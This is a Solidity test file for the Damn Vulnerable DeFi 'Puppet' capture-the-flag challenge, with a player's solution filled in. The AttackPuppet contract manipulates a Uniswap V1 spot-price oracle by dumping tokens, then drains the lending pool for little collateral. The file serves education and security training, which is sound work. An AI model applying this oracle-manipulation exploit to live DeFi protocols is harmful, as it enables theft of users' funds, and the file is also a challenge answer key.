// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";

contract PuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPrivateKey;

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
    uint256 constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 25e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;

    DamnValuableToken token;
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;
    IUniswapV1Factory uniswapV1Factory;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPrivateKey) = makeAddrAndKey("player");

        startHoax(deployer);

        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy a exchange that will be used as the factory template
        IUniswapV1Exchange uniswapV1ExchangeTemplate =
            IUniswapV1Exchange(deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV1Exchange.json")));

        // Deploy factory, initializing it with the address of the template exchange
        uniswapV1Factory = IUniswapV1Factory(deployCode("builds/uniswap/UniswapV1Factory.json"));
        uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));

        // Deploy token to be traded in Uniswap V1
        token = new DamnValuableToken();

        // Create a new exchange for the token
        uniswapV1Exchange = IUniswapV1Exchange(uniswapV1Factory.createExchange(address(token)));

        // Deploy the lending pool
        lendingPool = new PuppetPool(address(token), address(uniswapV1Exchange));

        // Add initial token and ETH liquidity to the pool
        token.approve(address(uniswapV1Exchange), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV1Exchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(
            0, // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            block.timestamp * 2 // deadline
        );

        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(uniswapV1Exchange.factoryAddress(), address(uniswapV1Factory));
        assertEq(uniswapV1Exchange.tokenAddress(), address(token));
        assertEq(
            uniswapV1Exchange.getTokenToEthInputPrice(1e18),
            _calculateTokenToEthInputPrice(1e18, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE)
        );
        assertEq(lendingPool.calculateDepositRequired(1e18), 2e18);
        assertEq(lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE), POOL_INITIAL_TOKEN_BALANCE * 2);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_puppet() public checkSolvedByPlayer {
        /*
        The goal of this challenge is to drain the lending pool of all its tokens by borrowing them.
        The PuppetPool contract requires that the borrower deposits twice the value of the tokens they want to borrow in ETH.
        It uses the Uniswap pair to calculate the price of the token in ETH.
        The vulnerability relies that we can interact with the Uniswap pair to manipulate the price of the token.
        The attack consists of swapping a large amount of tokens for ETH in the Uniswap pair, which will decrease the price of the token.
        Dumping all the player initial tokens to the uniswap pair will make the price of the token very low, allowing the player to borrow all the tokens from the lending pool.
        */


        // run this test with the following command to avoid calling other puppet tests
        // forge test --match-contract PuppetChallenge --match-test test_puppet


        // Deploy the attack contract
        AttackPuppet attack = new AttackPuppet{value: PLAYER_INITIAL_ETH_BALANCE}(address(lendingPool), address(token), address(uniswapV1Exchange), recovery);
        // transfer DVT to the attack contract
        token.transfer(address(attack), PLAYER_INITIAL_TOKEN_BALANCE);
        // Execute the attack
        attack.attack();
    }

    // Utility function to calculate Uniswap prices
    function _calculateTokenToEthInputPrice(uint256 tokensSold, uint256 tokensInReserve, uint256 etherInReserve)
        private
        pure
        returns (uint256)
    {
        return (tokensSold * 997 * etherInReserve) / (tokensInReserve * 1000 + tokensSold * 997);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All tokens of the lending pool were deposited into the recovery account
        assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
        assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}


contract AttackPuppet {
    address public puppetPool;
    address public player;
    address public token;
    address public uniswapV1Exchange;
    address public recovery;

    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;

    constructor(address _puppetPool, address _token, address _uniswapV1Exchange, address _recovery) payable {
        puppetPool = _puppetPool;
        token = _token;
        uniswapV1Exchange = _uniswapV1Exchange;
        recovery = _recovery;
    }

    function attack() public {
        // Approve the puppet pool to spend all tokens
        DamnValuableToken(token).approve(puppetPool, type(uint256).max);

        // Swap 1000 DVT for ETH in the Uniswap exchange
        uint256 tokenBalance = DamnValuableToken(token).balanceOf(address(this));
        DamnValuableToken(token).approve(uniswapV1Exchange, tokenBalance);
        IUniswapV1Exchange(uniswapV1Exchange).tokenToEthSwapInput(tokenBalance, 1, block.timestamp);

        // get the token balance in the uniswap pair
        uint256 tokenBalanceInPair = DamnValuableToken(token).balanceOf(uniswapV1Exchange);
        console.log("Token balance in pair : %d", tokenBalanceInPair);
        // get the eth balance in the uniswap pair
        uint256 ethBalanceInPair = address(uniswapV1Exchange).balance;
        console.log("Eth balance in pair : %d", ethBalanceInPair);

        uint256 oraclePrice = ethBalanceInPair * 1e18 / tokenBalanceInPair;
        console.log("Oracle price : %d", oraclePrice);

        // get how much is required to borrow the POOL_INITIAL_TOKEN_BALANCE
        uint256 depositInEthRequired = PuppetPool(puppetPool).calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        console.log("Deposit in eth required : %d", depositInEthRequired);


        // get how much is POOL_INITIAL_TOKEN_BALANCE in ETH after the swap
        // 98308957740657026 wei = 1 DVT = 0.098308957740657026 ETH
        // i comment out this because the test is using the raw balance of the uniswap pair (eth and token) instead of using the getEthToTokenInputPrice function
        // uint256 ethToPay = IUniswapV1Exchange(uniswapV1Exchange).getTokenToEthInputPrice(POOL_INITIAL_TOKEN_BALANCE) * 2;
        // console.log("Total pool token price in eth : %d", ethToPay);

        // Borrow all the tokens from the pool
        PuppetPool(puppetPool).borrow{value: depositInEthRequired}(POOL_INITIAL_TOKEN_BALANCE, recovery);
    }

    receive() external payable {}

}